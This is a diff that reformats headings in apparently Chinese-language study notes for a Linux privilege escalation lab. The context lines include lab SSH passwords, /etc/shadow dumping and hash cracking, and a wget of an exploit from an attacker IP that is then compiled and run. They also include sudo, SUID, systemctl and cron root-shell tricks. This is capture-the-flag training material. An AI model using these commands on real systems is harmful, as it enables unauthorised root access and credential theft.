@@ -3,7 +3,7 @@
 	--> 權限較低的帳戶到權限較高的帳戶
 	--> ssh karen@10.10.163.255 Password1
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> Enumeration : 
+### Enumeration : 
 		--> whoami 
 			--> karen
 		--> hostname : 傳回目標電腦的主機名稱
@@ -111,8 +111,7 @@
 		--> General Linux Commands
 			--> find, locate, grep, cut, sort
 		
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> Automated Enumeration Tools
+### Automated Enumeration Tools
 		--> LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
 		=> need upload to shell: 
 		--> 1. option 
@@ -133,7 +132,7 @@
 			--> ./lse.sh help | bash lse.sh 
 			
 ## Privilege Escalation:
-	--> Kernel Exploits :
+### Kernel Exploits :
 		--> 內核利用方法
 			--> 識別核心版本 => uname -a
 			--> 搜尋並找到目標系統核心版本的漏洞程式碼 =>cve => https://www.exploit-db.com/
@@ -147,8 +146,7 @@
 				--> wget 10.11.92.230:80/37292.c
 				--> gcc 37292.c -o 37292
 				--> ./37292
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~		
-	--> Sudo :
+### Sudo :
 		--> sudo 指令允許您以 root 權限執行程式
 		--> sudo -l : 使用該命令檢查其目前與root權限相關的情況
 		--> https://gtfobins.github.io/
@@ -196,8 +194,7 @@
 			--> Hash password : cat /etc/shadow
 
 			
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
-	--> SUID : 
+### SUID : 
 		--> ssh karen@10.10.65.78 | Password1
 		--> SUID（設備使用者識別）和 SGID（設備群組識別）而改變
 		--> 列出設定了 SUID 或 SGID 位元的檔案 :
@@ -253,8 +250,7 @@
 			--> 尋找flag3.txt檔  : find . -name flags3.txt 2>/dev/null
 			 --> /usr/bin/base64 flag3.txt | /usr/bin/base64 -d
 			 
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> Capabilities : 
+### Capabilities : 
 		--> getcap 工具列出啟用的功能 : have to wait
 			=> getcap -r / 2>/dev/null
 				=>沒有設定 SUID 位元 :  /home/alper/vim = cap_setuid+ep
@@ -275,8 +271,7 @@
 					=>root@ip-10-10-77-33:~# 
 				--> find / -name flag4.txt 2>/dev/null
 			
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> Cron Jobs : 
+### Cron Jobs : 
 		--> 用於在特定時間執行腳本或二進位檔案
 		--> /etc/crontab => to find a sh
 		
@@ -313,8 +308,7 @@
 				--> grep matt /etc/passwd
 			--> unshadow passwd shadow | tee Password
 				--> john --wordlist=/usr/share/wordlists/rockyou.txt Password		
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> PATH
+### PATH
 		--> PATH 是一個環境變量 : 告訴作業系統在哪裡搜尋可執行檔
 		--> echo $PATH
 		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -366,8 +360,7 @@
 				--> find / -name flag6.txt 2>/dev/null
 				--> cat /home/matt/flag6.txt
 
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> Network File Sharing (NFS)
+### Network File Sharing (NFS)
 		-->  /etc/exports
 		--> “no_root_squash” :禁止以 root 權限操作任何檔案。
 		-> we need 建立一個設定了 SUID 位元的可執行檔並在目標系統上執行“no_root_squash” 
@@ -431,8 +424,7 @@
 				--> cat ./home/matt/flag7.txt
 		
 
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> Capstone Challenge
+## Capstone Challenge
 		--> ssh leonard@10.10.176.55  | Penny123
 		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 		--> flag1 
@@ -452,7 +444,7 @@
 			--> https://gtfobins.github.io
 			--> sudo find . -exec /bin/sh \; -quit
 			--> find / -name flag2.txt 2>/dev/null	
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 		--> SUID 
 			--> GTFOBins => systemctl
 				=> 將“id > /tmp/output”更改為“sh -p”或“chmod +s /bin/bash”
@@ -464,7 +456,7 @@
 					WantedBy=multi-user.target' > $TF
 					systemctl link $TF
 					systemctl enable --now $TF
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~		
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~		
 		--> PATH  :
 			--> find / -perm -u=s -type f 2>/dev/null
 				=> /usr/bin/menu
